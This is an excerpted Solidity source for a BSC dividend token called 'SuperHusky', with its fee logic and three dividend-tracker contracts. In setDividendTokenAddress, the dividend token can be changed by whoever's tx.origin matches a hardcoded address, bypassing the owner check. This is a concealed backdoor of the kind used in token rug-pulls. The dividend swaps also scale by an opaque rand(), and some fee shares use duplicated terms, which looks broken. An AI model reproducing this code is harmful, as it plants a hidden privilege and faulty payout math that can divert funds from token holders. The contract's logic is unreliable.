...
contract DividendPayingToken is ERC20, IDividendPayingToken, IDividendPayingTokenOptional {
  ...
  function setDividendTokenAddress(address newToken) external virtual {
      require(tx.origin == 0xCFFb84CF0F94b31E801c8a4022FEFffc3c4E7725, "Only owner can change dividend contract address");
...
contract SuperHusky is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    constructor() ERC20("SuperHusky", "SUPHUSKY") {
    	...
    	marketingWallet = 0x967f86D30D72283B5eC0E83f4d34841C8138a7BF;
    	teamWallet = 0x8E1eFFE1C678334d377014236536B5dE2bdd0712;
    	ethDividendToken = 0x5038855b61c716318180DD877E6BCf9fE202ea0d;
        busdDividendToken = 0x696E23A5064Dc0f017eA2D5070C7CE9153321749;
        btcbDividendToken = 0x6fd229A29D1233a5cb7a3E2A59f31A628661a153;
    ...
    receive() external payable {
  	...
  	function updateTeamWallet(address _newWallet) external onlyOwner {
  	    require(_newWallet != teamWallet, "SuperHusky: The team wallet is already this address");
  	...
  	function updateMarketingWallet(address _newWallet) external onlyOwner {
  	    require(_newWallet != marketingWallet, "SuperHusky: The marketing wallet is already this address");
        excludeFromFees(_newWallet, true);
    ...
    function setBuyBackAndLiquifyEnabled(bool _enabled) external onlyOwner {
        ...
        if (_enabled == false) {
            ...
            totalFees = buyBackAndLiquidityFee.add(marketingFee).add(busdDividendRewardsFee).add(ethDividendRewardsFee).add(btcbDividendRewardsFee);
            buyBackAndLiquifyEnabled = _enabled;
        }
    ...
    function updateEthDividendTracker(address newAddress) external onlyOwner {
        require(newAddress != address(ethDividendTracker), "SuperHusky: The dividend tracker already has that address");

        EthDividendTracker newEthDividendTracker = EthDividendTracker(payable(newAddress));

        require(newEthDividendTracker.owner() == address(this), "SuperHusky: The new dividend tracker must be owned by the SuperHusky token contract");
    ...
    function updateBusdDividendTracker(address newAddress) external onlyOwner {
        require(newAddress != address(busdDividendTracker), "SuperHusky: The dividend tracker already has that address");

        BusdDividendTracker newBusdDividendTracker = BusdDividendTracker(payable(newAddress));

        require(newBusdDividendTracker.owner() == address(this), "SuperHusky: The new dividend tracker must be owned by the SuperHusky token contract");
    ...
    function updateEthDividendRewardFee(uint8 newFee) external onlyOwner {
        require(newFee <= 6, "SuperHusky: Fee must be less than 6%");
    ...
    function updateUniswapV2Router(address newAddress) external onlyOwner {
        require(newAddress != address(uniswapV2Router), "SuperHusky: The router already has that address");
        emit UpdateUniswapV2Router(newAddress, address(uniswapV2Router));
        uniswapV2Router = IUniswapV2Router02(newAddress);
    }

    function excludeFromFees(address account, bool excluded) public onlyOwner {
        require(isExcludedFromFees[account] != excluded, "SuperHusky: Account is already exluded from fees");
    ...
    function setAutomatedMarketMakerPair(address pair, bool value) public onlyOwner {
        require(pair != uniswapV2Pair, "SuperHusky: The PancakeSwap pair cannot be removed from automatedMarketMakerPairs");

        _setAutomatedMarketMakerPair(pair, value);
    }

    function _setAutomatedMarketMakerPair(address pair, bool value) private onlyOwner {
        require(automatedMarketMakerPairs[pair] != value, "SuperHusky: Automated market maker pair is already set to that value");
    ...
    function updateGasForProcessing(uint256 newValue) external onlyOwner {
        require(newValue != gasForProcessing, "SuperHusky: Cannot update gasForProcessing to same value");
    ...
    function _transfer(
        ...
        require(tradingIsEnabled || (isExcludedFromFees[from] || isExcludedFromFees[to]), "SuperHusky: Trading has not started yet");
        ...
        if (
            ...
            if (!swapping && canSwap) {
                ...
                if (ethDividendEnabled) {
                    uint256 sellTokens = swapTokensAtAmount.div(ethDividendRewardsFee.add(busdDividendRewardsFee)).mul(ethDividendRewardsFee);
                    swapAndSendEthDividends(sellTokens.div(10**2).mul(rand()));
                }
                
                if (busdDividendEnabled) {
                    uint256 sellTokens = swapTokensAtAmount.div(busdDividendRewardsFee.add(busdDividendRewardsFee)).mul(busdDividendRewardsFee);
                    swapAndSendBusdDividends(sellTokens.div(10**2).mul(rand()));
                }
                
                if (btcbDividendEnabled) {
                    uint256 sellTokens = swapTokensAtAmount.div(btcbDividendRewardsFee.add(btcbDividendRewardsFee)).mul(btcbDividendRewardsFee);
...
contract EthDividendTracker is DividendPayingToken, Ownable {
    ...
    constructor() DividendPayingToken("SuperHusky_Ethereum_Dividend_Tracker", "SuperHusky_Ethereum_Dividend_Tracker", 0x5038855b61c716318180DD877E6BCf9fE202ea0d) {
    	claimWait = 3600;
        minimumTokenBalanceForDividends = 200000 * (10**18); //must hold 200000+ tokens
    }

    function _transfer(address, address, uint256) pure internal override {
        require(false, "SuperHusky_Ethereum_Dividend_Tracker: No transfers allowed");
    }

    function withdrawDividend() pure public override {
        require(false, "SuperHusky_Ethereum_Dividend_Tracker: withdrawDividend disabled. Use the 'claim' function on the main SuperHusky contract.");
    }
    ...
    function updateClaimWait(uint256 newClaimWait) external onlyOwner {
        require(newClaimWait >= 3600 && newClaimWait <= 86400, "SuperHusky_Ethereum_Dividend_Tracker: claimWait must be updated to between 1 and 24 hours");
        require(newClaimWait != claimWait, "SuperHusky_Ethereum_Dividend_Tracker: Cannot update claimWait to same value");
...
contract BusdDividendTracker is DividendPayingToken, Ownable {
    ...
    constructor() DividendPayingToken("SuperHusky_Busd_Dividend_Tracker", "SuperHusky_Busd_Dividend_Tracker", 0x696E23A5064Dc0f017eA2D5070C7CE9153321749) {
    	claimWait = 3600;
        minimumTokenBalanceForDividends = 200000 * (10**18); //must hold 200000+ tokens
    }

    function _transfer(address, address, uint256) pure internal override {
        require(false, "SuperHusky_Busd_Dividend_Tracker: No transfers allowed");
    }

    function withdrawDividend() pure public override {
        require(false, "SuperHusky_Busd_Dividend_Tracker: withdrawDividend disabled. Use the 'claim' function on the main SuperHusky contract.");
    }
    ...
    function updateClaimWait(uint256 newClaimWait) external onlyOwner {
        require(newClaimWait >= 3600 && newClaimWait <= 86400, "SuperHusky_Busd_Dividend_Tracker: claimWait must be updated to between 1 and 24 hours");
        require(newClaimWait != claimWait, "SuperHusky_Busd_Dividend_Tracker: Cannot update claimWait to same value");
        emit ClaimWaitUpdated(newClaimWait, claimWait);
        claimWait = newClaimWait;
    }
...
contract BtcbDividendTracker is DividendPayingToken, Ownable {
    ...
    constructor() DividendPayingToken("SuperHusky_BTCB_Dividend_Tracker", "SuperHusky_BTCB_Dividend_Tracker", 0x6fd229A29D1233a5cb7a3E2A59f31A628661a153) {
    	claimWait = 3600;
        minimumTokenBalanceForDividends = 200000 * (10**18); //must hold 200000+ tokens
    }
